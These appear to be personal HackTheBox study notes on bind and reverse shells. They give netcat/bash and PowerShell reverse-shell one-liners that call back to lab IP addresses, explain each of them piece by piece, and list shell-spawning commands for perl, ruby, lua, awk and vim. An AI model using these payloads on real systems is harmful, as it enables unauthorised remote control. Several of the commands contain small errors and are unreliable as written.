[[HackTheBox]]

#### Bind Shell
local attack box to control the remote system through its shell. 

![[Pasted image 20250724231042.png]]

### Establishing a Basic Bind Shell with Netcat

Netcat
to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

No. 1: Server - Binding a Bash shell to the TCP session
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 8001 > /tmp/f
```

No. 2: Client
```
nc -lnvp 8001
```

# Payloads
## One-Liners Examined
#### One-Liners Examined Netcat/Bash Reverse Shell One-liner

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

#### Remove /tmp/f
```
rm -f /tmp/f;
```
Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. 
#### Make a Named Pipe
```
mkfifo /tmp/f;
```
Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.
#### Output Redirection
```
cat /tmp/f |
```
Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).
#### Set Shell Options
```
/bin/bash -i 2>&1 | 
```
Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).
#### Open a Connection with Netcat
```
nc 10.10.14.12 8001 > tmp/f
```


# PowerShell One-liner Explained
#### Powershell One-liner
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Calling Powershell
```
powershell -nop -c 
```
Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes.
#### Binding A Socket
```
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```
Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). 
#### Setting The Command Stream
```
$stream = $client.GetStream();
```
Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications.
#### Empty Byte Stream
```
[byte[]]$bytes = 0..65535|%{0}; 
```
Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array.
#### Stream Parameters
```
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

#### Set The Byte Encoding
```
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
Sets/evaluates the variable ${;data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. 
#### Invoke-Expression
```
$sendback = (iex $data 2>&1 | Out-String ); 
```
Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. 
#### Show Working Directory
```
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```
Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine >.
#### Sets Sendbyte
```
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.
#### Terminate TCP Conenction
```
$client.Close()"
```


# Spawing Interactive Shells

#### /bin/sh -i
This command will execute the shell interpreter specified in the path in interactive mode (-i).
```
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

#### Perl To Shell
If the programming language Perl is present on the system, these commands will execute the shell interpreter specified.

```
perl —e 'exec "/bin/sh";'
```

```
perl: exec "/bin/sh";
```
The command directly above should be run from a script.

Ruby
Ruby To Shell
```
ruby: exec "bin/sh/"
```

Lua
we can use the os.execute method to execute the shell interpreter specified using the full command below:
```
lua: os.execute('bin/sh')
```

AWK
AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports.
```
awk 'BEGIN {system("/bin/sh")}'
```

VIM
command-line-based text-editor
```
vim -c ':!/bin/sh'
```
